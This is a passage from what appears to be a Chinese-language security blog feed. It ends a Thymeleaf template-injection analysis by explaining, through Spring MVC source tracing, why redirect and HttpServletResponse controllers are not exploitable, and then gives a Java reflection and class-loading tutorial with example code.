class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/test&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">vulTest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String path)</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;path:&quot;</span> + path);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:xxx/&quot;</span> + path + <span class="hljs-string">&quot;/zzz&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A528.png"></p><h4 id="4-HttpServletResponse"><a href="#4-HttpServletResponse" class="headerlink" title="4.HttpServletResponse"></a>4.HttpServletResponse</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/test/&#123;path&#125;&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">vulTest02</span><span class="hljs-params">(HttpServletResponse response)</span></span>&#123;<br>        log.info(<span class="hljs-string">&quot;Test02&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>自定义返回，当参数中存在HttpServletResponse时，SpringMVC认为此时用户自定义了返回数据，无需SpringMVC帮助处理，所以此种情况下同样不存在漏洞</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A529.png"></p><p>其原因是当控制器存在HttpServletResponse类型的参数时，在获取变量时会将<code>ModelAndViewContainer</code>对象的<code>requestHandled</code>值置为true，进而导致<code>ModelAndViewContainer</code>对象为null，也就是mv为null。具体分析思路如下</p><p><code>DispatchServlet</code>    <code>ha.handle(processedRequest, response, mappedHandler.getHandler())</code> 处下断，跟进handle方法</p><p>来到<code>this.handleInternal(request, response, (HandlerMethod)handler);</code>，继续跟进</p><p>来到<code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter</code> 的 <code>handleInternal</code>方法</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A530.png"></p><p>来到该类的<code>invokeHandlerMethod()</code>，一些基础设置没必要看，直接到来第543行，跟进</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A531.png"></p><p>来到该类的<code>invokeAndHandle</code>方法，直接跟进<code>this.invokeForRequest(webRequest, mavContainer, providedArgs);</code></p><p>来到<code>org.springframework.web.method.support.InvocableHandlerMethod</code>的<code>invokeForRequest</code>方法</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A532.png"></p><p>来到<code>getMethodArgumentValues</code>方法，该方法本身是用来获取参数的，但是<code>args[i] = this.resolvers.resolveArgument(parameter, mavContainer, request, this.dataBinderFactory);</code>这一行会改变<code>mavContainer</code>中<code>requestHandled</code>的值，直接跟进这一行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Object[] getMethodArgumentValues(NativeWebRequest request, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer, Object... providedArgs) <span class="hljs-keyword">throws</span> Exception &#123;<br>    MethodParameter[] parameters = <span class="hljs-keyword">this</span>.getMethodParameters();<br>    <span class="hljs-keyword">if</span> (ObjectUtils.isEmpty(parameters)) &#123;<span class="hljs-comment">// 判断参数列表是否为空</span><br>        <span class="hljs-keyword">return</span> EMPTY_ARGS;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        Object[] args = <span class="hljs-keyword">new</span> Object[parameters.length];<span class="hljs-comment">// 创建一个Object数据，准备接收参数</span><br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; parameters.length; ++i) &#123;<span class="hljs-comment">// 遍历参数列表</span><br>            MethodParameter parameter = parameters[i];<br>            parameter.initParameterNameDiscovery(<span class="hljs-keyword">this</span>.parameterNameDiscoverer);<span class="hljs-comment">// 参数初始化</span><br>            args[i] = findProvidedArgument(parameter, providedArgs);<span class="hljs-comment">// 一种假定？？不是很理解，但不重要</span><br>            <span class="hljs-keyword">if</span> (args[i] == <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">this</span>.resolvers.supportsParameter(parameter)) &#123;<br>                    <span class="hljs-comment">// 判断是否有合适的参数解析器，也就是判断是否支持该参数类型</span><br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalStateException(formatArgumentError(parameter, <span class="hljs-string">&quot;No suitable resolver&quot;</span>));<br>                &#125;<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    args[i] = <span class="hljs-keyword">this</span>.resolvers.resolveArgument(parameter, mavContainer, request, <span class="hljs-keyword">this</span>.dataBinderFactory);<span class="hljs-comment">// 获取参数，以及当参数类型为HttpServletResponse时做一些设置</span><br>                &#125; <span class="hljs-keyword">catch</span> (Exception var10) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.logger.isDebugEnabled()) &#123;<br>                        String exMsg = var10.getMessage();<br>                        <span class="hljs-keyword">if</span> (exMsg != <span class="hljs-keyword">null</span> &amp;&amp; !exMsg.contains(parameter.getExecutable().toGenericString())) &#123;<br>                            <span class="hljs-keyword">this</span>.logger.debug(formatArgumentError(parameter, exMsg));<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-keyword">throw</span> var10;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> args;<span class="hljs-comment">// 返回参数列表</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>来到<code>org.springframework.web.method.support.HandlerMethodArgumentResolverComposite</code>的<code>resolveArgument</code>方法</p><p>当参数类型是：普通参数类型（例如：String\Integer\Double）时</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A533.png"></p><p>此时跟进第65行，进入到<code>org.springframework.web.method.annotation.AbstractNamedValueMethodArgumentResolver</code>的<code>resolveArgument</code>方法中</p><p>当参数类型是：HttpServletResponse时</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A534.png"></p><p>此时跟进第65行，进入到<code>org.springframework.web.servlet.mvc.method.annotation.ServletResponseMethodArgumentResolver</code>的<code>resolveArgument</code>方法中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">resolveArgument</span><span class="hljs-params">(MethodParameter parameter, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer, NativeWebRequest webRequest, <span class="hljs-meta">@Nullable</span> WebDataBinderFactory binderFactory)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>    <span class="hljs-keyword">if</span> (mavContainer != <span class="hljs-keyword">null</span>) &#123;<span class="hljs-comment">// 为真</span><br>        mavContainer.setRequestHandled(<span class="hljs-keyword">true</span>);  <span class="hljs-comment">// requestHandled的值设置为true</span><br>    &#125;<br><br>    Class&lt;?&gt; paramType = parameter.getParameterType();<br>    <span class="hljs-keyword">return</span> ServletResponse.class.isAssignableFrom(paramType) ? <span class="hljs-keyword">this</span>.resolveNativeResponse(webRequest, paramType) : <span class="hljs-keyword">this</span>.resolveArgument(paramType, (ServletResponse)<span class="hljs-keyword">this</span>.resolveNativeResponse(webRequest, ServletResponse.class));<br>&#125;<br></code></pre></td></tr></table></figure><p>回到<code>RequestMappingHandlerAdapter</code>第545行，跟进</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A535.png"></p><p>来到<code>RequestMappingHandlerAdapter</code>第545行</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A536.png"></p><p>到这里基本理解了mv为空的原因，mv为空，不需要渲染了，所以漏洞也不存在了</p><h3 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h3><ul><li><a href="https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#messages">教程：使用 Thymeleaf</a></li><li><a href="https://forum.butian.net/index.php/share/1922">Thymeleaf SSTI</a></li><li><a href="https://www.anquanke.com/post/id/254519#h3-5">Java安全之Thymeleaf SSTI分析</a></li><li><a href="https://xz.aliyun.com/t/8568#toc-3">由WCTF2020 Thymeleaf分析payload形式</a></li><li><a href="https://github.com/veracode-research/spring-view-manipulation">spring-view-manipulation</a></li><li><a href="https://blog.csdn.net/CPLASF_/article/details/110189503">springmvc源码-参数解析</a></li><li><a href="https://www.cnpanda.net/sec/1063.html">Thymeleaf SSTI 分析以及最新版修复的 Bypass</a></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Java 反射</title>
    <link href="/2022/08/27/Java%E5%8F%8D%E5%B0%84/"/>
    <url>/2022/08/27/Java%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[<h2 id="Java-反射（reflection）"><a href="#Java-反射（reflection）" class="headerlink" title="Java 反射（reflection）"></a>Java 反射（reflection）</h2><p>反射的引入，当知道一个类的类名时，想通过程序自动引入/创建，传统方法是无法实现，因为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> 类名--&gt; 其中类名无法是其他类型的数据，必须由编写人员进行编写<br>--&gt; 无法实现动态的获取某个指定的类<br>--&gt; 因此引入反射<br></code></pre></td></tr></table></figure><p>反射真正要实现的：通过<strong>外部文件配置</strong>，在<strong>不修改源码</strong>的情况，来<strong>控制程序</strong>，让Java代码拥有一定的动态特性。</p><h3 id="反射的Hello-World"><a href="#反射的Hello-World" class="headerlink" title="反射的Hello World"></a>反射的Hello World</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 一个等下由反射调用的类</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cat</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String name = <span class="hljs-string">&quot;招财猫&quot;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">hi</span><span class="hljs-params">(String word)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;hi &quot;</span> + word);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReflectionQuestion</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException </span>&#123;<br>        <span class="hljs-comment">// 根据配置文件 re.properties 指定信息，创建Cat对象并调用方法hi</span><br><br>        Properties properties = <span class="hljs-keyword">new</span> Properties();<br>        properties.load(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;src\\re.properties&quot;</span>));<br>        String classfulpath = properties.get(<span class="hljs-string">&quot;classfulpath&quot;</span>).toString();<br>        String methodName = properties.getProperty(<span class="hljs-string">&quot;method&quot;</span>).toString();<br><br>        <span class="hljs-comment">// 使用反射来获取类并调用其中方法</span><br>        <span class="hljs-comment">// 1.加载类    返回Class类型的对象</span><br>        Class aClass = Class.forName(classfulpath);<br>        <span class="hljs-comment">// 2.通过aClass 得到加载类的 com.mechoy.Cat 的对象实例</span><br>        Object o = aClass.newInstance();<br>        System.out.println(o.getClass());       <span class="hljs-comment">// 获取运行类型</span><br>        <span class="hljs-comment">// 3.通过 aClass 得到你加载的类的 com.mechoy.Cat 的 methodName 的方法对象</span><br>        <span class="hljs-comment">//      即：在反射中，可以把方法是为对象</span><br>        Method method = aClass.getMethod(methodName,String.class);<br>        <span class="hljs-comment">// 4.通过方法对象 method 调用 com.mechoy.Cat 类中的 methodName 方法</span><br>        <span class="hljs-comment">//  即：通过方法对象来实现调用方法</span><br>        <span class="hljs-comment">// 传统方法 : 对象.方法()</span><br>        <span class="hljs-comment">//  反射机制: 方法.invoke(对象)</span><br>        Object invoke = method.invoke(o, <span class="hljs-string">&quot;xxx&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="反射机制🚩"><a href="#反射机制🚩" class="headerlink" title="反射机制🚩"></a>反射机制🚩</h3><ol><li>反射机制允许程序在执行期间借助于Reflection API取得任何类的内部信息(比如成员变量、构造器、成员方法等)，并能操作对象的属性及方法。反射在设计模式和框架底层都会用到</li><li>加载完类之后，在堆中就产生了一个Class类型的对象（一个类只有一个Class对象），这个对象包含了类的完整结构信息。通过这个对象得到类的结构。该对象就像一面镜子，透过这个镜子看到类的结构，所以，形象的称之为：<strong>反射</strong></li></ol><h4 id="Java反射机制原理示意图"><a href="#Java反射机制原理示意图" class="headerlink" title="Java反射机制原理示意图"></a>Java反射机制原理示意图</h4><p><img src="/2022/08/27/Java%E5%8F%8D%E5%B0%84/Java%E5%8F%8D%E5%B0%8401.png"></p><h4 id="反射机制的作用"><a href="#反射机制的作用" class="headerlink" title="反射机制的作用"></a>反射机制的作用</h4><ol><li>在运行时判断任意一个对象所属的类</li><li>在运行时构造任意一个类的对象</li><li>在运行时得到任意一个类所具有的成员变量和方法</li><li>在运行时调用任意一个对象的成员变量和方法</li><li>生成动态代理</li></ol><h4 id="反射机制的优缺点"><a href="#反射机制的优缺点" class="headerlink" title="反射机制的优缺点"></a>反射机制的优缺点</h4><p>优点：可以动态的创建和使用对象（各类框架底层核心），使用灵活，没有反射机制，框架技术就失去底层支持</p><p>缺点：使用反射基本是解释执行，对执行速度有影响</p><h3 id="Class类🚩"><a href="#Class类🚩" class="headerlink" title="Class类🚩"></a>Class类🚩</h3><p><img src="/2022/08/27/Java%E5%8F%8D%E5%B0%84/Java%E5%8F%8D%E5%B0%8402.png"></p><ol><li>Class也是类，因此也继承Object类</li><li>Class类对象不是new出来的，而是系统创建的</li><li>对于某个类的Class类对象，在内存中只有一份，因为类只加载一次</li><li>每一个类的实例都会记得自己是由哪个Class实例所生成</li><li>通过Class可以完整地得到一个类的完整结构，通过Class类的方法</li><li>Class对象是存在在堆的</li><li>类的字节码二进制数据，是放在方法区的，有点地方称为类的元数据（包括方法代码、变量名、方法名、访问权限等等）</li></ol><h4 id="Class类的常用方法"><a href="#Class类的常用方法" class="headerlink" title="Class类的常用方法"></a>Class类的常用方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 示例类</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Car</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> String brand=<span class="hljs-string">&quot;BMW&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> price=<span class="hljs-number">500000</span>;<br>    <span class="hljs-keyword">public</span> String color=<span class="hljs-string">&quot;black&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Class02</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchFieldException </span>&#123;<br>        String classAllPath = <span class="hljs-string">&quot;com.mechoy.Car&quot;</span>;<br>        <span class="hljs-comment">// 1.获取对应类的 Class对象</span><br>        <span class="hljs-comment">// &lt;?&gt;  表示不确定的Java类型，可不写</span><br>        Class&lt;?&gt; aClass = Class.forName(classAllPath);<br>        <span class="hljs-comment">// 2.输出aClass</span><br>        System.out.println(aClass);     <span class="hljs-comment">// 显示是哪个类的Class对象</span><br>        System.out.println(aClass.getClass());  <span class="hljs-comment">// 输出运行类型</span><br>        <span class="hljs-comment">// 3.得到包名.Class对象对应的那个类所在的包</span><br>        System.out.println(aClass.getPackage());<br>        <span class="hljs-comment">// 4.得到类名,Class对象对应的那个类的全类名</span><br>        System.out.println(aClass.getName());<br>        <span class="hljs-comment">// 5.生成Class对象对应的那个类的对象实例,例如此处强转成Car</span><br>        Car car = (Car)aClass.newInstance();<br>        System.out.println(car);<br>        <span class="hljs-comment">// 6.通过反射获取属性[FieId] 例如此处brand,获取public修饰的属性</span><br>        Field brand = aClass.getField(<span class="hljs-string">&quot;brand&quot;</span>);<br>        System.out.println(brand.get(car));<br>        <span class="hljs-comment">// 7.设置属性值</span><br>        brand.set(car,<span class="hljs-string">&quot;Audi&quot;</span>);<br>        System.out.println(car);<br>        <span class="hljs-comment">// 8.得到所有的属性,遍历，得到所有的属性值</span><br>        Field[] fields = aClass.getFields();<br>        <span class="hljs-keyword">for</span> (Field field: fields) &#123;<br>            System.out.println(field.get(car));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="获取Class类对象的方式"><a href="#获取Class类对象的方式" class="headerlink" title="获取Class类对象的方式"></a>获取Class类对象的方式</h4><ol><li><p>方式一</p><ul><li>前提：已知一个类的全类名，且该类在类路径下，可以通过Class类的静态方法<code>forName()</code>获取，可能抛出ClassNotFoundException</li></ul></li></ol><ul><li>实例：<code>Class cls1 = Class.forName(&quot;java.lang.Cat&quot;)</code><ul><li>应用场景：多用于配置文件，读取类全路径，加载类</li><li><strong>注意：</strong><code>Class.forName(&quot;fulClassName&quot;)</code>将类进行初始化，加载类，不会创建类的实例对象，得到的是一个Class的实例对象</li></ul></li></ul><ol start="2"><li><p>方式2</p><ul><li><p>前提：若已知具体的类，通过类的class获取，该方式最为安全可靠，程序性能最高</p></li><li><p>实例：Class cls2 = Cat.class</p></li><li><p>应用场景：多用于参数传递，比如通过反射得到对应构造器对象 </p></li><li><p><strong>注意：</strong>在使用该方式获取Class类对象时，并不会初始化该对象（可以理解成为不会加载静态变量和静态代码块）</p><p><img src="/2022/08/27/Java%E5%8F%8D%E5%B0%84/Java%E5%8F%8D%E5%B0%8405.png"></p></li></ul></li><li><p>方式3</p><ul><li>前提：已知某个类的实例，调用该实例的getClass()方法获取Class对象</li><li>实例：<code>Class clazz = 对象.getClass</code>   // 获取运行类型</li><li>应用场景：通过创建好的对象，获取Class对象</li></ul></li><li><p>方式4</p><ul><li><p>通过类加载器</p></li><li><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// (1) 先得到类加载器</span><br>ClassLoader classLoader = car.getClass().getClassLoader();<br><span class="hljs-comment">// (2) 通过类加载器得到Class对象</span><br>Class&lt;?&gt; cls4 = classLoader.loadClass(<span class="hljs-string">&quot;com.mechoy.Car&quot;</span>);<br></code></pre></td></tr></table></figure></li><li><p>应用场景：无</p></li></ul></li><li><p>基本数据类型(int,char,boolean,float,double,byte,long,short)按如下方式得到Class对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Class cls = 基本数据类型.class<br><span class="hljs-comment">// Class&lt;Integer&gt; integerClass = int.class;</span><br></code></pre></td></tr></table></figure></li><li><p>基本数据类型对应的包装类，可以通过.type得到Class类对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Class cls = 包装类.TYPE<br><span class="hljs-comment">// 示例：</span><br>Class&lt;Integer&gt; type = Integer.TYPE;<br>System.out.println(type);   <span class="hljs-comment">// 得到基本数据类型</span><br></code></pre></td></tr></table></figure></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetClass</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException </span>&#123;<br>        <span class="hljs-comment">// 方式1 Class.forName</span><br>        String classFulPath = <span class="hljs-string">&quot;com.mechoy.Car&quot;</span>;<br>        Class&lt;?&gt; cls1 = Class.forName(classFulPath);<br>        System.out.println(cls1.getName());<br><br>        <span class="hljs-comment">// 方式2 类名.class,多用于参数传递</span><br>        Class&lt;Car&gt; cls2 = Car.class;<br>        System.out.println(cls2);<br><br>        <span class="hljs-comment">// 方式3</span><br>        Car car = <span class="hljs-keyword">new</span> Car();<br>        Class&lt;? extends Car&gt; cls3 = car.getClass();<br>        System.out.println(cls3);<br><br>        <span class="hljs-comment">// 方式4 通过类加载器获取到类的Class对象【4种类加载器】</span><br>        <span class="hljs-comment">// (1) 先得到类加载器</span><br>        ClassLoader classLoader = car.getClass().getClassLoader();<br>        <span class="hljs-comment">// (2) 通过类加载器得到Class对象</span><br>        Class&lt;?&gt; cls4 = classLoader.loadClass(<span class="hljs-string">&quot;com.mechoy.Car&quot;</span>);<br>        System.out.println(cls4);<br><br>        <span class="hljs-comment">// cls1\cls2\cls3\cls4 是同一个Class对象</span><br>        System.out.println(cls1.hashCode());<br>        System.out.println(cls2.hashCode());<br>        System.out.println(cls3.hashCode());<br>        System.out.println(cls4.hashCode());<br><br>        <span class="hljs-comment">// 方式5 基本数据类型(int,char,boolean,float,double,byte,long,short)</span><br>        Class&lt;Integer&gt; integerClass = <span class="hljs-keyword">int</span>.class;<br>        System.out.println(integerClass);<br><br>        <span class="hljs-comment">// 方式6 基本数据类型对应的包装类</span><br>        Class&lt;Integer&gt; type = Integer.TYPE;<br>        System.out.println(type);   <span class="hljs-comment">// 得到基本数据类型</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="有Class类对象的类型"><a href="#有Class类对象的类型" class="headerlink" title="有Class类对象的类型"></a>有Class类对象的类型</h4><ol><li>外部类，成员内部类，静态内部类，局部内部类，匿名内部类</li><li>interface：接口</li><li>数组</li><li>enum：枚举</li><li>annotation：注解</li><li>基本数据类型</li><li>void</li></ol><h3 id="类加载🚩"><a href="#类加载🚩" class="headerlink" title="类加载🚩"></a>类加载🚩</h3><p>反射机制是java实现动态语言的关键，也就是通过反射实现类动态加载</p><ol><li>静态加载：编译时加载相关的类，如果没有则报错，依赖性太强</li><li>动态加载：运行时加载需要的类，如果运行时不用该类，则不报错，降低了依赖性</li></ol><h4 id="类加载时机"><a href="#类加载时机" class="headerlink" title="类加载时机"></a>类加载时机</h4><ol><li>当创建(new)对象时                            // 静态加载</li><li>当子类被加载时，父类也要被加载   // 静态加载</li><li>调用类中的静态成员时                      // 静态加载</li><li>通过反射                                             // 动态加载</li></ol><h4 id="类加载过程图"><a href="#类加载过程图" class="headerlink" title="类加载过程图"></a>类加载过程图</h4><p>类加载主要是分3个阶段</p><ol><li>加载[Loading]</li><li>连接[Linking]<ol><li>验证[verification]</li><li>准备[Preparation]</li><li>解析[Resolution]</li></ol></li><li>初始化[Initialization]</li></ol><p><img src="/2022/08/27/Java%E5%8F%8D%E5%B0%84/Java%E5%8F%8D%E5%B0%8403.png"></p><p><img src="/2022/08/27/Java%E5%8F%8D%E5%B0%84/Java%E5%8F%8D%E5%B0%8404.png"></p><h5 id="加载阶段"><a href="#加载阶段" class="headerlink" title="加载阶段"></a>加载阶段</h5><p>JVM在该阶段的主要目的是将字节码从不同的数据源（可能是class文件、也可能是jar包、甚至网络）转化为<strong>二进制字节流加载到内存中</strong>，并同时生成一个代表该类的java.lang.Class对象</p><h5 id="连接阶段-验证"><a href="#连接阶段-验证" class="headerlink" title="连接阶段-验证"></a>连接阶段-验证</h5><ol><li>确保Class文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身安全</li><li>包括：文件格式验证（是否以魔数oxcafebabe开头）、元数据验证、字节码验证和符合引用验证</li><li>可以考虑使用 -Xverify:none 参数来关闭大部分的类验证措施，缩短虚拟机类加载的时间</li></ol><h5 id="连接阶段-准备"><a href="#连接阶段-准备" class="headerlink" title="连接阶段-准备"></a>连接阶段-准备</h5><p>JVM会在该阶段对<strong>静态变量</strong>，分配内存并默认初始化（对应数据类型的默认初始化，如0、0L、null、false等）。这些<strong>变量所使用的的内存都将在方法区中进行分配</strong>。</p><h5 id="连接阶段-解析"><a href="#连接阶段-解析" class="headerlink" 